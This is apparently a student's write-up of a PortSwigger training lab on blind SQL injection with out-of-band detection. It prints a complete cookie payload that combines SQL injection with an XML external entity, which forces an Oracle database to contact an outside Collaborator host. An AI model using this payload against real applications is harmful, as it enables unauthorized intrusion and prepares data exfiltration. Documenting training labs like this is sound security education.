# Lab 16: Blind SQL Injection with Out-of-Band Interaction

**Platform:** PortSwigger Web Security Academy

## What's going on here

Every technique so far relied on the vulnerable app's own response — a message, an error, a delay. This one flips that entirely: instead of watching the app for a signal, the injection makes the *database itself* reach out to an external server. No response content needed at all — just proof that an outbound DNS/HTTP request happened somewhere else.

## 🎯 Target

Trigger an out-of-band interaction from the database to a Burp Collaborator server, confirming injection without relying on any in-band signal.

## The bypass

Modified the `TrackingId` cookie with a payload combining SQL injection and an XXE technique — using `EXTRACTVALUE` and `xmltype` to force the database to parse XML that references an external entity:

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l')+FROM+dual--


![Modified TrackingId cookie with the XXE/Collaborator payload before insertion](images/lab16-step1-payload-draft.png)

The `BURP-COLLABORATOR-SUBDOMAIN` placeholder gets swapped for a real, unique subdomain by right-clicking the request in Burp and selecting **Insert Collaborator payload** — Burp auto-generates a subdomain it's actively listening on.

The mechanism: the XML declares an external entity pointing at that Collaborator subdomain. When Oracle parses it via `xmltype`, it tries to resolve that external reference — meaning the database itself makes an outbound network request to a server completely outside the application, with zero need for any response to come back to the browser.

![Burp Collaborator client showing the incoming interaction](images/lab16-step2-collaborator-hit.png)

Sent the request, then checked the **Collaborator tab** in Burp for incoming interactions.

## Result

Burp Collaborator logged a DNS/HTTP interaction originating from the database server — confirming the injection executed, purely through an out-of-band channel with no visible response difference at all.

![Interaction log entry confirming the hit](images/lab16-step3-interaction-log.png)

## Takeaway

Out-of-band techniques matter because they work even when an application gives away absolutely nothing — no error, no timing difference, no content change. As long as the injected query can force the database to make an outbound network call, Collaborator (or any listener you control) becomes the response channel instead of the app itself.

---

Confirming injection out-of-band is one thing. The real payoff is doing the same trick but actually smuggling data out through that same channel — no waiting on true/false, straight exfiltration: **[Lab 17 — Blind SQL Injection with Out-of-Band Data Exfiltration](lab-17-oob-exfiltration.md)**.
